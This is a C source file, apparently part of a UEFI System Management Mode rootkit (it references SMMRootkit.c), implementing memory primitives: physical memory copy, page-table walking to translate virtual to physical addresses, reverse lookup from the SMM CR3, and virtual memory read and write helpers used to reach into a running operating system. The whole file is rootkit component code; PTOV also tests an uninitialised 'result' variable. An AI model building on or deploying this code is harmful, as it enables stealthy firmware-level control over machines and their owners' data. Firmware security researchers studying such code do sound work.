#include "Memory.h"

// from SMMRootkit.c
extern EFI_SMM_SYSTEM_TABLE2 *gSmst2;

BOOLEAN p_memCpy(UINT64 dest, UINT64 src, size_t n, BOOLEAN verbose)
{
  // Check if the address ranges are in allowed range
  if ((IsAddressValid((UINT64)src) == FALSE || IsAddressValid((UINT64)(src + n - 1)) == FALSE))
  {
    SerialPrintString("[p_memCpy] Aborted duo to disallowed memory range \r\n");

    return FALSE;
  }

  // Typecast src and dest addresses to (char *)
  CHAR8 *csrc = (char *)src;
  CHAR8 *cdest = (char *)dest;

  // Copy contents of src[] to dest[]
  for (INT32 i = 0; i < n; i++)
    cdest[i] = csrc[i];

  return TRUE;
}

UINT64 VTOP(UINT64 address, UINT64 directoryBase, BOOLEAN verbose)
{
  if (address == 0 && verbose)
  {
    SerialPrintStringDebug("[VTOP] address is 0 \r\n");
    return 0;
  }

  if (directoryBase == 0 && verbose)
  {
    SerialPrintStringDebug("[VTOP] directoryBase is 0 \r\n");
    return 0;
  }

  directoryBase &= ~0xf;

  UINT64 pageOffset = address & ~(~0ul << PAGE_OFFSET_SIZE);
  UINT64 pte = ((address >> 12) & (0x1ffll));
  UINT64 pt = ((address >> 21) & (0x1ffll));
  UINT64 pd = ((address >> 30) & (0x1ffll));
  UINT64 pdp = ((address >> 39) & (0x1ffll));

  if (verbose)
  {
    SerialPrintString("Dirbase:  ");
    SerialPrintNumber(directoryBase, 16);
    SerialPrintString(" VA ");
    SerialPrintNumber(address, 16);
    SerialPrintString(" PO:  ");
    SerialPrintNumber(pageOffset, 16);
    SerialPrintString(" PTE ");
    SerialPrintNumber(pte, 16);
    SerialPrintString(" PT ");
    SerialPrintNumber(pt, 16);
    SerialPrintString(" PD ");
    SerialPrintNumber(pd, 16);
    SerialPrintString(" PDP ");
    SerialPrintNumber(pdp, 16);
    SerialPrintString("\r\n");
  }

  UINT64 pdpe = 0;
  p_memCpy((UINT64)&pdpe, directoryBase + 8 * pdp, sizeof(UINT64), verbose);

  if (verbose)
  {
    SerialPrintString("Dump PDPE at ");
    SerialPrintNumber(directoryBase + 8 * pdp, 16);
    SerialPrintString("results ");
    SerialPrintNumber(pdpe, 16);
    SerialPrintString("\r\n");
  }

  if (~pdpe & 1)
    return 0;

  UINT64 pde = 0;
  p_memCpy((UINT64)&pde, (UINT64)(pdpe & PMASK2) + 8 * pd, sizeof(UINT64), verbose);

  if (verbose)
  {
    SerialPrintString("Dump pde at ");
    SerialPrintNumber((pdpe & PMASK2) + 8 * pd, 16);
    SerialPrintString("results ");
    SerialPrintNumber(pde, 16);
    SerialPrintString("\r\n");
  }

  if (~pde & 1)
    return 0;

  /* 1GB large page, use pde's 12-34 bits */
  if (pde & 0x80)
    return (pde & (~0ull << 42 >> 12)) + (address & ~(~0ull << 30));

  UINT64 pteAddr = 0;
  p_memCpy((UINT64)&pteAddr, (UINT64)(pde & PMASK2) + 8 * pt, sizeof(UINT64), verbose);

  if (verbose)
  {
    SerialPrintString("Dump pteAddr at ");
    SerialPrintNumber((pde & PMASK2) + 8 * pt, 16);
    SerialPrintString("results ");
    SerialPrintNumber(pteAddr, 16);
    SerialPrintString("\r\n");
  }

  if (~pteAddr & 1)
    return 0;

  /* 2MB large page */
  if (pteAddr & 0x80)
    return (pteAddr & PMASK) + (address & ~(~0ull << 21));

  p_memCpy((UINT64)&address, (UINT64)(pteAddr & PMASK) + 8 * pte, sizeof(UINT64), verbose);

  address = address & PMASK;

  if (verbose)
  {
    SerialPrintString("Dump address at ");
    SerialPrintNumber((pteAddr & PMASK) + 8 * pte, 16);
    SerialPrintString("results ");
    SerialPrintNumber(address, 16);
    SerialPrintString("\r\n");
  }

  if (!address)
    return 0;

  // UINT64 tempPhys = address & 0xFFFFFFFFFFFFF000;
  // UINT64 physAddress = tempPhys + virtOffs;

  return address + pageOffset;
}

// Declaration for ASM func
UINT64 GetCR3(VOID);

BOOLEAN PTOV(UINT64 qwAddrPhys, UINT64 *pqwAddrVirt, UINT64 *pqwPTE, UINT64 *pqwPDE, UINT64 *pqwPDPTE, UINT64 *pqwPML4E, BOOLEAN verbose)
{
  BOOLEAN result, fFirstRun;
  UINT64 PML4[512], PDPT[512], PD[512], PT[512];
  UINT64 PML4_idx = 0xfff, PDPT_idx = 0xfff, PD_idx = 0xfff, PT_idx = 0xfff;
  UINT64 qwA;
  UINT64 qwPageTableData;

  UINT64 Cr3 = GetCR3(); // Get Cr3 from SMM Environment

  SerialPrintStringDebug("[PTOV] Got Cr3, dumping PML4 \r\n");

  *PML4 = Cr3 & 0x0000fffffffff000;

  qwA = 0;
  fFirstRun = TRUE;
  while (qwA || fFirstRun)
  {
    fFirstRun = FALSE;
    if (qwA & 0xffff800000000000)
    {
      qwA |= 0xffff800000000000;
    }
    if (PML4_idx != (0x1ff & (qwA >> 39))) // PML4
    {
      PML4_idx = 0x1ff & (qwA >> 39);
      qwPageTableData = PML4[PML4_idx];
      if ((qwPageTableData & 0x81) != 0x01)
      {
        qwA = (qwA + 0x0000008000000000) & 0xffffff8000000000;
        continue;
      }
      p_memCpy((UINT64)PDPT, qwPageTableData & 0x0000fffffffff000, 0x1000, verbose);

      PDPT_idx = 0xfff;
      PD_idx = 0xfff;
      PT_idx = 0xfff;
    }

    if (PDPT_idx != (0x1ff & (qwA >> 30))) // PDPT(Page-Directory Pointer Table)
    {
      PDPT_idx = 0x1ff & (qwA >> 30);
      qwPageTableData = PDPT[PDPT_idx];
      if ((qwPageTableData & 0x81) != 0x01)
      {
        qwA = (qwA + 0x0000000040000000) & 0xffffffffC0000000;
        continue;
      }
      p_memCpy((UINT64)PD, qwPageTableData & 0x0000fffffffff000, 0x1000, verbose);

      if (!result)
      {
        qwA = (qwA + 0x0000000040000000) & 0xffffffffC0000000;
        continue;
      }
      PD_idx = 0xfff;
      PT_idx = 0xfff;
    }

    if (PD_idx != (0x1ff & (qwA >> 21)))
    { // PD (Page Directory)
      PD_idx = 0x1ff & (qwA >> 21);
      qwPageTableData = PD[PD_idx];
      if (((qwPageTableData & 0x81) == 0x81) && ((qwPageTableData & 0x0000ffffffe00000) == (qwAddrPhys & 0x0000ffffffe00000)))
      { // map 2MB page
        *pqwAddrVirt = qwA + (qwAddrPhys & 0x1fffff);
        if (pqwPTE)
        {
          *pqwPTE = PD[PD_idx];
        }
        if (pqwPDE)
        {
          *pqwPDE = PD[PD_idx];
        }
        if (pqwPDPTE)
        {
          *pqwPDPTE = PDPT[PDPT_idx];
        }
        if (pqwPML4E)
        {
          *pqwPML4E = PML4[PML4_idx];
        }
        return TRUE;
      }
      if ((qwPageTableData & 0x81) != 0x01)
      {
        qwA = (qwA + 0x0000000000200000) & 0xffffffffffE00000;
        continue;
      }
      p_memCpy((UINT64)PT, qwPageTableData & 0x0000fffffffff000, 0x1000, verbose);

      if (!result)
      {
        qwA = (qwA + 0x0000000000200000) & 0xffffffffffE00000;
        continue;
      }
      PT_idx = 0xfff;
    }

    if (PT_idx != (0x1ff & (qwA >> 12)))
    { // PT (Page Table)
      PT_idx = 0x1ff & (qwA >> 12);
      qwPageTableData = PT[PT_idx];
      if (((qwPageTableData & 0x01) == 0x01) && ((qwPageTableData & 0x0000fffffffff000) == (qwAddrPhys & 0x0000fffffffff000)))
      {
        *pqwAddrVirt = qwA + (qwAddrPhys & 0xfff);
        if (pqwPTE)
        {
          *pqwPTE = PT[PT_idx];
        }
        if (pqwPDE)
        {
          *pqwPDE = PD[PD_idx];
        }
        if (pqwPDPTE)
        {
          *pqwPDPTE = PDPT[PDPT_idx];
        }
        if (pqwPML4E)
        {
          *pqwPML4E = PML4[PML4_idx];
        }
        return TRUE;
      }
      qwA = (qwA + 0x0000000000001000) & 0xfffffffffffff000;
      continue;
    }
  }
  return FALSE;
}

BOOLEAN v_memWrite(UINT64 dest, UINT64 src, size_t n, UINT64 directoryBase, BOOLEAN verbose)
{
  // Translate to physical
  UINT64 pDest = VTOP(dest, directoryBase, FALSE);

  if (pDest == 0)
  {
    return FALSE;
  }

  // Read physical
  return p_memCpy(pDest, src, n, verbose);
}

BOOLEAN v_memReadMultiPage(UINT64 dest, UINT64 src, size_t n, UINT64 directoryBase, BOOLEAN verbose)
{
  UINT64 curr_vAddr = src;
  UINT64 read = 0;

  while (n > 0)
  {
    UINT64 nextPage = (curr_vAddr + 0x1000) & ~0xfff;
    UINT64 to_read = nextPage - curr_vAddr;

    // if it's the "last" read
    if (n < to_read)
      to_read = n;

    // Translate to physical
    UINT64 pSrc = VTOP(curr_vAddr, directoryBase, FALSE);
    if (pSrc == 0)
    {
      return FALSE;
    }
    // read physical
    p_memCpy(dest + read, pSrc, to_read, verbose);
    n -= to_read;
    read += to_read;
    curr_vAddr += to_read;
  }
  return TRUE;
}

BOOLEAN v_memRead(UINT64 dest, UINT64 src, size_t n, UINT64 directoryBase, BOOLEAN verbose)
{
  // Translate to physical
  UINT64 pSrc = VTOP(src, directoryBase, FALSE);

  if (pSrc == 0)
  {
    return FALSE;
  }

  // Read physical
  return p_memCpy(dest, pSrc, n, verbose);
}
